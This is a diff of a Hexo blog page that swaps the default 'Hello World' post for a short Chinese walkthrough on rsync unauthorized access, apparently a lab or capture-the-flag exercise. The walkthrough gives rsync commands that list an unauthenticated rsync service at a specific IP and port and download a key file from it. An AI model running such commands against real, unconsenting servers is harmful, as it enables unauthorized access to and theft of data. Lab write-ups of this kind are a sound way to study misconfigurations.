@@ -93,27 +93,28 @@
         
   <article class="post">
     <div class="post-title">
-      <h2 class="title">Hello World</h2>
+      <h2 class="title">rsync未授权访问</h2>
        
+        <p>rsync未授权访问</p>
+      
     </div>
      <div class="post-meta">
-      <span class="post-time">2018-08-20</span>
+      <span class="post-time">2018-10-15</span>
     </div>
     <div class="post-content">
-      <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
+      <h5 id="1-连接："><a href="#1-连接：" class="headerlink" title="1.连接："></a>1.连接：</h5><pre><code>root@kali:~# rsync -vvvv rsync://219.153.49.228:47035/ 
+</code></pre><h5 id="2-查看volume下文件"><a href="#2-查看volume下文件" class="headerlink" title="2.查看volume下文件"></a>2.查看volume下文件</h5><pre><code>root@kali:~# rsync -vvvv rsync://219.153.49.228:47035/volume
+</code></pre><h5 id="3-下载cat-key-32158476426747-php到root下"><a href="#3-下载cat-key-32158476426747-php到root下" class="headerlink" title="3.下载cat key_32158476426747.php到root下"></a>3.下载cat key_32158476426747.php到root下</h5><pre><code>root@kali:~# rsync -avz rsync://219.153.49.228:47035/volume/key_32158476426747.php /root
+</code></pre><h5 id="4-查看cat-key-32158476426747-php内容"><a href="#4-查看cat-key-32158476426747-php内容" class="headerlink" title="4.查看cat key_32158476426747.php内容"></a>4.查看cat key_32158476426747.php内容</h5><pre><code>root@kali:~# cat key_32158476426747.php
+</code></pre>
     </div>
   </article>
   <div class="post-nav">
     <div class="post-nav-next post-nav-item">
+      
+        <a href="/2018/10/15/CouchDB未授权访问/" rel="next" title="CouchDB未授权访问">
+          <i class="fa fa-chevron-left"></i> CouchDB未授权访问
+        </a>
       
     </div>
 
@@ -121,8 +122,8 @@
 
     <div class="post-nav-prev post-nav-item">
     
-        <a href="/2018/09/18/DVWA安装/" rel="prev" title="DVWA安装">
-          DVWA安装 <i class="fa fa-chevron-right"></i>
+        <a href="/2018/10/15/redis未授权访问/" rel="prev" title="redis未授权访问">
+          redis未授权访问 <i class="fa fa-chevron-right"></i>
         </a>
       
     </div>
